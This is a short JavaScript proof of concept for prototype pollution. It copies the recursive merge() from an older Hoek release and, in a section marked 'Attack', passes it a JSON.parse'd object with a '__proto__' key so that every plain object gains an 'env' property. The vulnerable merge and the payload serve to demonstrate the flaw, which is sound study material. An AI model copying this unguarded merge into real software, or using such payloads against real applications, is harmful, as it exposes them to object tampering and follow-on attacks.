'use strict';;
// This is the merge from an older version of the Hoek package
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
function merge(dest, src) { // extracted from the merge() function in Hoek.
    for (var attr in src) {
        if (isObject(dest[attr]) && isObject(src[attr])) {
            merge(dest[attr], src[attr]);
        } else {
            // otherwise, assign the property from source to the destination.
            dest[attr] = src[attr];
        }
    }
    return dest;
}

// Attack
var d = JSON.parse(`{"__proto__": {"env": { "x": 10 }}}`);
merge({}, d);
const x = {}; // prototype inheritance can thus lead to prototype pollution.
// cosnt x = { __proto__: 1 }; // this is ignored, but with JSON.parse(), the method could have work.
console.log({}.env); // { x: 10 }